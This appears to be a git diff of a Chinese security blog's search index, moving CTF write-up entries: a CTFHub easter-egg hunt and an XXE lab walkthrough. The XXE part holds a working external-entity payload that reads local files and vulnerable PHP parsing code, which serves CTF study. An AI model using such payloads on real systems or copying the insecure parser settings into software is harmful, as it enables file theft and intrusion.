@@ -20,33 +20,6 @@
       </categories>
   </entry>
   <entry>
-    <title>ctfhub-彩蛋</title>
-    <url>/2022/11/CTFHub%E5%BD%A9%E8%9B%8B/</url>
-    <content><![CDATA[<h1 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h1><p>一开始的想法是工具一共有8页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页limit都是12 但offset在变化<br>于是<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/0b4b33ac483e49a9945a279bd42d7cd8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这样设置参数<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/f9fc1f1792d84ca193c1ac4910dfce25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在长度为1000到6、7千左右随便一个双击后 <code>点击响应</code> 看<code>响应</code>包<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/92c81d3b913d4800a9c19030d3079d7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在最后一行</p>
-<h1 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h1><p><a href="https://api.ctfhub.com/">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/42334be7914f498c96d55daecf1f09fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h1><p>在web-ssrf中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838">ctfhub-ssrf</a>post最后一行介绍</p>
-<h1 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h1><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p>
-<blockquote>
-<p>彩蛋	关键词	egg	ctfhub	CTFHub	拿来把你	CTFer 自己人 ……</p>
-</blockquote>
-<p>到底没想到竟然是flag</p>
-<h1 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h1><p>只找到了前半部分<br>分别在题目提交和wp提交页面的最后</p>
-<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">ctfhub</span><span class="token punctuation">&#123;</span>029e02eb3a1
-	e8c49b1132b5
-	15b652a5f3a8
-	62013<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢anweilx的<a href="https://www.cnblogs.com/anweilx/p/12493000.html">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜<code>奖励</code> 在上面那行一个是base64然后再转url 一个是hex解码<br>第三行是俩页面的图片隐写 丢进winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
-<h1 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h1><p>剩余皆可在对应页面搜索egg即可获得</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Bypass disable_function</title>
     <url>/2022/11/Bypass%20disable_function/</url>
     <content><![CDATA[<h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><p>时间紧 于是先采用最省时的方法<br>先蚁剑连<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/5939a50eab1c40fe8eff4ae65dc3b730.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现打不开flag文件<br>要使用蚁剑插件<code>绕过disabled function</code></p>
@@ -252,6 +225,33 @@ AddHandler cgi-script .cgi   <span aria-hidden="true" class="line-numbers-rows">
       </tags>
   </entry>
   <entry>
+    <title>ctfhub-彩蛋</title>
+    <url>/2022/11/CTFHub%E5%BD%A9%E8%9B%8B/</url>
+    <content><![CDATA[<h1 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h1><p>一开始的想法是工具一共有8页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页limit都是12 但offset在变化<br>于是<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/0b4b33ac483e49a9945a279bd42d7cd8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这样设置参数<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/f9fc1f1792d84ca193c1ac4910dfce25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在长度为1000到6、7千左右随便一个双击后 <code>点击响应</code> 看<code>响应</code>包<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/92c81d3b913d4800a9c19030d3079d7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在最后一行</p>
+<h1 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h1><p><a href="https://api.ctfhub.com/">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/42334be7914f498c96d55daecf1f09fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h1><p>在web-ssrf中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838">ctfhub-ssrf</a>post最后一行介绍</p>
+<h1 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h1><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p>
+<blockquote>
+<p>彩蛋	关键词	egg	ctfhub	CTFHub	拿来把你	CTFer 自己人 ……</p>
+</blockquote>
+<p>到底没想到竟然是flag</p>
+<h1 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h1><p>只找到了前半部分<br>分别在题目提交和wp提交页面的最后</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">ctfhub</span><span class="token punctuation">&#123;</span>029e02eb3a1
+	e8c49b1132b5
+	15b652a5f3a8
+	62013<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢anweilx的<a href="https://www.cnblogs.com/anweilx/p/12493000.html">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜<code>奖励</code> 在上面那行一个是base64然后再转url 一个是hex解码<br>第三行是俩页面的图片隐写 丢进winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/">解码</a></p>
+<h1 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h1><p>剩余皆可在对应页面搜索egg即可获得</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PyJail python沙箱逃逸探究</title>
     <url>/2023/02/PyJail%20python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%8E%A2%E7%A9%B6/</url>
     <content><![CDATA[<h1 id="python-特性"><a href="#python-特性" class="headerlink" title="python 特性"></a>python 特性</h1><p>在python中，类均继承自<code>object</code>基类；</p>
@@ -411,6 +411,92 @@ AddHandler cgi-script .cgi   <span aria-hidden="true" class="line-numbers-rows">
       </tags>
   </entry>
   <entry>
+    <title>xxe</title>
+    <url>/2022/11/XXE/</url>
+    <content><![CDATA[<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>发现输入的username被alert了<br>查源码	</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onclick<span class="token operator">=</span><span class="token string">"XMLFunction()"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/5db2cfc89d444078a9eb3b1c0d013582.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">抓包看xml格式<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/f0d808b8650248d5829499816debc6de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">回来看控制台<br>发现js的xml应用</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
+        <span class="token keyword">function</span> <span class="token function">XMLFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">var</span> xml <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">+</span>
+                <span class="token string">'&lt;?xml version="1.0" encoding="UTF-8"?>'</span> <span class="token operator">+</span>
+            <span class="token string">'&lt;root>'</span> <span class="token operator">+</span>
+            <span class="token string">' &lt;username>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/username>'</span> <span class="token operator">+</span>
+            <span class="token string">' &lt;password>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/password>'</span> <span class="token operator">+</span>
+            <span class="token string">' &lt;/root>'</span><span class="token punctuation">;</span>
+            <span class="token keyword">var</span> xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token function">alert</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+            xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"login.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>构造xxe攻击<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/47c06ac5625149b68b8b8f6a5c7ed1b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这是post包<code>传的时候记得把注释删去</code></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY flag SYSTEM "file:///flag"><span class="token comment">&lt;!--构造实体--></span>
+</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&flag;">&amp;flag;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--输出flag实体--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>2333<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>flag{6866a844-3788-4a9d-9909-1d9d9943f56f}</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/cd6a7f863a0647bb892ae50de7f3e0f9.png" alt="在这里插入图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/13c964cfa670469aa893c588d287e821.png" alt="在这里插入图片描述"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/**
+* autor: c0ny1
+* date: 2018-2-7
+*/</span>
+
+<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span>
+<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
+
+<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
+	<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
+	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>	
+<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>有admin密码了也没用<br>藏内网了，上次比赛ssrf题出过</p>
+<ul>
+<li>etc&#x2F;hosts </li>
+<li>proc&#x2F;net&#x2F;arp<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/a3a597abcb6b4158bcce5dcbb89afe09.png" alt="在这里插入图片描述"></li>
+</ul>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xxe</tag>
+        <tag>buuctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfhub-rce</title>
     <url>/2022/11/ctfhub-rce/</url>
     <content><![CDATA[<p>rce：远程代码执行漏洞<br>分为远程命令执行ping和远程代码执行evel。<br><strong>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞</strong>。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p>
@@ -551,92 +637,6 @@ if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
       </tags>
   </entry>
   <entry>
-    <title>xxe</title>
-    <url>/2022/11/XXE/</url>
-    <content><![CDATA[<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>发现输入的username被alert了<br>查源码	</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onclick<span class="token operator">=</span><span class="token string">"XMLFunction()"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/5db2cfc89d444078a9eb3b1c0d013582.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">抓包看xml格式<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/f0d808b8650248d5829499816debc6de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">回来看控制台<br>发现js的xml应用</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span>
-        <span class="token keyword">function</span> <span class="token function">XMLFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-            <span class="token keyword">var</span> xml <span class="token operator">=</span> <span class="token string">''</span> <span class="token operator">+</span>
-                <span class="token string">'&lt;?xml version="1.0" encoding="UTF-8"?>'</span> <span class="token operator">+</span>
-            <span class="token string">'&lt;root>'</span> <span class="token operator">+</span>
-            <span class="token string">' &lt;username>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/username>'</span> <span class="token operator">+</span>
-            <span class="token string">' &lt;password>'</span> <span class="token operator">+</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/password>'</span> <span class="token operator">+</span>
-            <span class="token string">' &lt;/root>'</span><span class="token punctuation">;</span>
-            <span class="token keyword">var</span> xmlhttp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            xmlhttp<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-                <span class="token keyword">if</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
-                    <span class="token function">alert</span><span class="token punctuation">(</span>xmlhttp<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-                <span class="token punctuation">&#125;</span>
-            <span class="token punctuation">&#125;</span>
-            xmlhttp<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span><span class="token string">"login.php"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-            xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
-    <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>构造xxe攻击<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/47c06ac5625149b68b8b8f6a5c7ed1b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这是post包<code>传的时候记得把注释删去</code></p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
-<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">
-&lt;!ENTITY flag SYSTEM "file:///flag"><span class="token comment">&lt;!--构造实体--></span>
-</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&flag;">&amp;flag;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--输出flag实体--></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>2333<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>
